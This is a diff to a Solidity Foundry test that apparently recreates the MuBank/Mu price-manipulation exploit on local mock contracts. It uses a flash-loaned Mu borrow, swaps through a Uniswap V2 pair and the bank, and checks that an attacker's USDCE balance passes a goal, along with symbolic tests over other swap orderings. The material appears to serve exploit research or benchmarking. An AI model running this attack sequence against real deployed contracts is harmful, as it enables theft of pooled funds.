@@ -1,21 +1,21 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
-import "forge-std/Test.sol";
-import "@utils/QueryBlockchain.sol";
-import {UniswapV2Router} from "@utils/UniswapV2Router.sol";
 import "./Mu.sol";
 import "./MuBank.sol";
-import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
-import "@utils/USDCE.sol";
+import "@utils/QueryBlockchain.sol";
+import "forge-std/Test.sol";
+import {USDCE} from "@utils/USDCE.sol";
 import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
+import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
+import {UniswapV2Router} from "@utils/UniswapV2Router.sol";
 
 contract MUMUGTest is Test, BlockLoader {
-    MuBank mubank;
     Mu mu;
     USDCE usdce;
     UniswapV2Pair pair;
     UniswapV2Factory factory;
     UniswapV2Router router;
+    MuBank mubank;
     address attacker;
     address constant owner = address(0x123456);
     uint112 reserve0pair = 110596398651;
@@ -58,55 +58,46 @@ contract MUMUGTest is Test, BlockLoader {
         router = new UniswapV2Router(address(factory), address(0xdead));
         mubank = new MuBank(address(router), address(pair), address(mu));
         // Initialize balances and mock flashloan.
-        mu.transfer(address(mubank), balanceOfmumubank);
-        mu.transfer(address(pair), balanceOfmupair);
-        mu.approve(attacker, UINT256_MAX);
-        usdce.transfer(address(mubank), balanceOfusdcemubank);
         usdce.transfer(address(pair), balanceOfusdcepair);
+        mu.transfer(address(pair), balanceOfmupair);
+        mu.transfer(address(mubank), balanceOfmumubank);
         usdce.approve(attacker, UINT256_MAX);
+        mu.approve(attacker, UINT256_MAX);
         vm.stopPrank();
     }
 
     function printBalance(string memory tips) public {
         emit log_string(tips);
-        emit log_string("Mubank Balances: ");
-        queryERC20BalanceDecimals(address(mu), address(mubank), mu.decimals());
-        queryERC20BalanceDecimals(
-            address(usdce),
-            address(mubank),
-            usdce.decimals()
-        );
-        emit log_string("");
         emit log_string("Pair Balances: ");
-        queryERC20BalanceDecimals(address(mu), address(pair), mu.decimals());
         queryERC20BalanceDecimals(
             address(usdce),
             address(pair),
             usdce.decimals()
         );
+        queryERC20BalanceDecimals(address(mu), address(pair), mu.decimals());
+        emit log_string("");
+        emit log_string("Mubank Balances: ");
+        queryERC20BalanceDecimals(
+            address(usdce),
+            address(mubank),
+            usdce.decimals()
+        );
+        queryERC20BalanceDecimals(address(mu), address(mubank), mu.decimals());
         emit log_string("");
         emit log_string("Attacker Balances: ");
-        queryERC20BalanceDecimals(address(mu), attacker, mu.decimals());
         queryERC20BalanceDecimals(address(usdce), attacker, usdce.decimals());
+        queryERC20BalanceDecimals(address(mu), attacker, mu.decimals());
         emit log_string("");
         emit log_string("");
         emit log_string("");
     }
 
     function attackGoal() public view returns (bool) {
-        return usdce.balanceOf(attacker) >= 10e6;
+        return usdce.balanceOf(attacker) >= 1e6;
     }
 
     function nop(uint256 amount) internal pure {
         return;
-    }
-
-    function borrow_mu(uint256 amount) internal {
-        mu.transferFrom(owner, attacker, amount);
-    }
-
-    function payback_mu(uint256 amount) internal {
-        mu.transfer(owner, amount);
     }
 
     function borrow_usdce(uint256 amount) internal {
@@ -115,6 +106,14 @@ contract MUMUGTest is Test, BlockLoader {
 
     function payback_usdce(uint256 amount) internal {
         usdce.transfer(owner, amount);
+    }
+
+    function borrow_mu(uint256 amount) internal {
+        mu.transferFrom(owner, attacker, amount);
+    }
+
+    function payback_mu(uint256 amount) internal {
+        mu.transfer(owner, amount);
     }
 
     function swap_pair_usdce_mu(uint256 amount) internal {
@@ -151,14 +150,14 @@ contract MUMUGTest is Test, BlockLoader {
     }
 
     function test_gt() public {
-        printBalance("Before step0: ");
-        borrow_mu(99000 ether);
-        printBalance("Before step1: ");
-        swap_pair_mu_usdce(99000 ether);
-        printBalance("Before step2: ");
-        swap_mubank_usdce_mu(22960 ether);
-        printBalance("Before step5: ");
-        payback_mu(99300 ether);
+        borrow_mu(99000e18);
+        printBalance("After step0 ");
+        swap_pair_mu_usdce(99000e18);
+        printBalance("After step1 ");
+        swap_mubank_usdce_mu(22960e18);
+        printBalance("After step2 ");
+        payback_mu(99297e18);
+        printBalance("After step3 ");
         require(attackGoal(), "Attack failed!");
     }
 
@@ -166,15 +165,13 @@ contract MUMUGTest is Test, BlockLoader {
         uint256 amt0,
         uint256 amt1,
         uint256 amt2,
-        uint256 amt3,
-        uint256 amt4,
-        uint256 amt5
+        uint256 amt3
     ) public {
-        vm.assume(amt5 == amt0 + 300 ether);
+        vm.assume(amt3 == 99594890999999989240398);
         borrow_mu(amt0);
         swap_pair_mu_usdce(amt1);
         swap_mubank_usdce_mu(amt2);
-        payback_mu(amt5);
+        payback_mu(amt3);
         assert(!attackGoal());
     }
 
@@ -182,15 +179,13 @@ contract MUMUGTest is Test, BlockLoader {
         uint256 amt0,
         uint256 amt1,
         uint256 amt2,
-        uint256 amt3,
-        uint256 amt4,
-        uint256 amt5
+        uint256 amt3
     ) public {
-        vm.assume(amt5 == amt0 + 300 ether);
+        vm.assume(amt3 == 99594890999999989240398);
         borrow_usdce(amt0);
         swap_mubank_usdce_mu(amt1);
         swap_pair_mu_usdce(amt2);
-        payback_usdce(amt5);
+        payback_usdce(amt3);
         assert(!attackGoal());
     }
 
@@ -198,15 +193,13 @@ contract MUMUGTest is Test, BlockLoader {
         uint256 amt0,
         uint256 amt1,
         uint256 amt2,
-        uint256 amt3,
-        uint256 amt4,
-        uint256 amt5
+        uint256 amt3
     ) public {
-        vm.assume(amt5 == amt0 + 300 ether);
+        vm.assume(amt3 == 99594890999999989240398);
         borrow_usdce(amt0);
         swap_pair_usdce_mu(amt1);
         swap_pair_mu_usdce(amt2);
-        payback_usdce(amt5);
+        payback_usdce(amt3);
         assert(!attackGoal());
     }
 
@@ -214,15 +207,13 @@ contract MUMUGTest is Test, BlockLoader {
         uint256 amt0,
         uint256 amt1,
         uint256 amt2,
-        uint256 amt3,
-        uint256 amt4,
-        uint256 amt5
+        uint256 amt3
     ) public {
-        vm.assume(amt5 == amt0 + 300 ether);
+        vm.assume(amt3 == 99594890999999989240398);
         borrow_mu(amt0);
         swap_pair_mu_usdce(amt1);
         swap_mubank_usdce_mu(amt2);
-        payback_mu(amt5);
+        payback_mu(amt3);
         assert(!attackGoal());
     }
 
@@ -230,15 +221,13 @@ contract MUMUGTest is Test, BlockLoader {
         uint256 amt0,
         uint256 amt1,
         uint256 amt2,
-        uint256 amt3,
-        uint256 amt4,
-        uint256 amt5
+        uint256 amt3
     ) public {
-        vm.assume(amt5 == amt0 + 300 ether);
+        vm.assume(amt3 == 99594890999999989240398);
         borrow_mu(amt0);
         swap_pair_mu_usdce(amt1);
         swap_pair_usdce_mu(amt2);
-        payback_mu(amt5);
+        payback_mu(amt3);
         assert(!attackGoal());
     }
 
@@ -247,15 +236,14 @@ contract MUMUGTest is Test, BlockLoader {
         uint256 amt1,
         uint256 amt2,
         uint256 amt3,
-        uint256 amt4,
-        uint256 amt5
+        uint256 amt4
     ) public {
-        vm.assume(amt5 == amt0 + 300 ether);
+        vm.assume(amt4 == 99594890999999989240398);
         borrow_usdce(amt0);
         swap_mubank_usdce_mu(amt1);
         swap_pair_mu_usdce(amt2);
-        swap_pair_mu_usdce(amt4);
-        payback_usdce(amt5);
+        swap_pair_mu_usdce(amt3);
+        payback_usdce(amt4);
         assert(!attackGoal());
     }
 
@@ -264,15 +252,14 @@ contract MUMUGTest is Test, BlockLoader {
         uint256 amt1,
         uint256 amt2,
         uint256 amt3,
-        uint256 amt4,
-        uint256 amt5
+        uint256 amt4
     ) public {
-        vm.assume(amt5 == amt0 + 300 ether);
+        vm.assume(amt4 == 99594890999999989240398);
         borrow_usdce(amt0);
         swap_pair_usdce_mu(amt1);
         swap_pair_mu_usdce(amt2);
-        swap_pair_mu_usdce(amt4);
-        payback_usdce(amt5);
+        swap_pair_mu_usdce(amt3);
+        payback_usdce(amt4);
         assert(!attackGoal());
     }
 
@@ -281,15 +268,14 @@ contract MUMUGTest is Test, BlockLoader {
         uint256 amt1,
         uint256 amt2,
         uint256 amt3,
-        uint256 amt4,
-        uint256 amt5
+        uint256 amt4
     ) public {
-        vm.assume(amt5 == amt0 + 300 ether);
+        vm.assume(amt4 == 99594890999999989240398);
         borrow_mu(amt0);
         swap_pair_mu_usdce(amt1);
         swap_mubank_usdce_mu(amt2);
         swap_pair_mu_usdce(amt3);
-        payback_mu(amt5);
+        payback_mu(amt4);
         assert(!attackGoal());
     }
 
@@ -298,15 +284,14 @@ contract MUMUGTest is Test, BlockLoader {
         uint256 amt1,
         uint256 amt2,
         uint256 amt3,
-        uint256 amt4,
-        uint256 amt5
+        uint256 amt4
     ) public {
-        vm.assume(amt5 == amt0 + 300 ether);
+        vm.assume(amt4 == 99594890999999989240398);
         borrow_mu(amt0);
         swap_pair_mu_usdce(amt1);
         swap_pair_usdce_mu(amt2);
         swap_pair_mu_usdce(amt3);
-        payback_mu(amt5);
+        payback_mu(amt4);
         assert(!attackGoal());
     }
 }
